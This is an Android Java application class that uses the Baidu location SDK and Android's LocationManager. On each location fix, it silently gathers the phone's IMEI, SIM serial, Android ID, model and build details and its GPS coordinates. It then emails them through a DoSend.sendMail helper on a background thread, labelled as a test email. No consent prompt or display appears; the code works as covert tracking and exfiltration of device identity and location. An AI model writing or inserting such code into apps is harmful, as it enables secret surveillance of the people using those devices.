package com.example.neituime;

import java.util.UUID;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.GeofenceClient;
import com.baidu.location.LocationClient;
import com.example.network.DoSend;
import com.example.network.GetHtml;

import android.app.Application;
import android.app.Service;
import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.os.Handler;
import android.os.Message;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

/**
 * 主Application
 */
public class LocationApplication extends Application {
	public LocationClient mLocationClient;
	public GeofenceClient mGeofenceClient;
	public MyLocationListener mMyLocationListener;
	
	public TextView mLocationResult,logMsg;
	public TextView trigger,exit;
	public Vibrator mVibrator;
	
	private String uniqueId = "";//机器识别码
	private String PostText="";
	@Override
	public void onCreate() {
		super.onCreate();
		mLocationClient = new LocationClient(this.getApplicationContext());
		mMyLocationListener = new MyLocationListener();
		mLocationClient.registerLocationListener(mMyLocationListener);
		mGeofenceClient = new GeofenceClient(getApplicationContext());
		mVibrator =(Vibrator)getApplicationContext().getSystemService(Service.VIBRATOR_SERVICE);
	}

	
	/**
	 * 实现实位回调监听
	 */
	public class MyLocationListener implements BDLocationListener {

		@Override
		public void onReceiveLocation(BDLocation location) {
			//Receive Location 
			StringBuffer sb = new StringBuffer(256);
			sb.append("time : ");
			sb.append(location.getTime());
			sb.append("\nerror code : ");
			sb.append(location.getLocType());
			sb.append("\nlatitude : ");
			sb.append(location.getLatitude());
			sb.append("\nlontitude : ");
			sb.append(location.getLongitude());
			sb.append("\nradius : ");
			sb.append(location.getRadius());
			if (location.getLocType() == BDLocation.TypeGpsLocation){
				sb.append("\nspeed : ");
				sb.append(location.getSpeed());
				sb.append("\nsatellite : ");
				sb.append(location.getSatelliteNumber());
				sb.append("\ndirection : ");
				sb.append("\naddr : ");
				sb.append(location.getAddrStr());
				sb.append(location.getDirection());
			} else if (location.getLocType() == BDLocation.TypeNetWorkLocation){
				sb.append("\naddr : ");
				sb.append(location.getAddrStr());
				//运营商信息
				sb.append("\noperationers : ");
				sb.append(location.getOperators()); 
			}
			logMsg(sb.toString());
			Log.i("BaiduLocationApiDem\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na", sb.toString()+"");
		}


	}
	
	
	/**
	 * 显示请求字符串
	 * @param str
	 */
	public void logMsg(String str) {
		PostText = str;
		PostMail();
		mLocationClient.stop();//定位之后就关掉吧
	}
	
	private void PostMail()
	{
		final TelephonyManager tm = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
		final String tmDevice, tmSerial, tmPhone, androidId;
		tmDevice = "" + tm.getDeviceId();
		tmSerial = "" + tm.getSimSerialNumber();
		androidId = "" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
		UUID deviceUuid = new UUID(androidId.hashCode(), ((long)tmDevice.hashCode() << 32) | tmSerial.hashCode());
		uniqueId = deviceUuid.toString();
		
		LocationManager loctionManager;
		String contextService=Context.LOCATION_SERVICE;
		//通过系统服务，取得LocationManager对象
		loctionManager=(LocationManager) getSystemService(contextService);
		
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);//高精度
		criteria.setAltitudeRequired(false);//不要求海拔
		criteria.setBearingRequired(false);//不要求方位
		criteria.setCostAllowed(true);//允许有花费
		criteria.setPowerRequirement(Criteria.POWER_LOW);//低功耗
		//从可用的位置提供器中，匹配以上标准的最佳提供器
		String provider = loctionManager.getBestProvider(criteria, true);
		//获得最后一次变化的位置
		Location location = loctionManager.getLastKnownLocation(provider);
		double la = 0;//纬度
		double lo= 0;//经度
		try
		{
			la = location.getLatitude();
			lo = location.getLongitude();
		}
		catch(Exception e)
		{
			
		}
		mThread mythread = new mThread(la, lo);
		mythread.start();
	}
	private class mThread extends Thread
	{
		double mLatitude;
		double mLongitude;
		public mThread(double Latitude, double Longitude)
		{
			mLatitude = Latitude;
			mLongitude = Longitude;
		}
		@Override
		public void run() 
		{
				//String url = "http://api.map.baidu.com/geocoder?output=json&location="+mLatitude+","+mLongitude+"&key=APP_KEY";
				//String GetCityJson = (new GetHtml()).GetJsonByUrl(url);
				DoSend.sendMail("依然是测试邮件\n" 
						+ "机器码：" + uniqueId + "\n"
						+ "Android " + android.os.Build.VERSION.RELEASE  + "\n"
						+ "" + android.os.Build.MODEL + "\n"
						+ "SDK：" +android.os.Build.VERSION.SDK + "\n"
						+ android.os.Build.HOST + "\n"
						+ android.os.Build.CPU_ABI + "\n"
					
						//+"城市："+ GetCityJson + "\n"
						+ "纬度：" + mLatitude + "\n"
						+ "经度：" + mLongitude+ "\n"
						+"\n下面是百度地图api获取的信息\n"
						+ PostText);//邮箱
				
				//mhandler.obtainMessage(0, GetCityJson).sendToTarget();
		}
		private Handler mhandler = new Handler()
		{
			@Override
			public void handleMessage(Message msg) 
			{
			}
		};
	}
	
}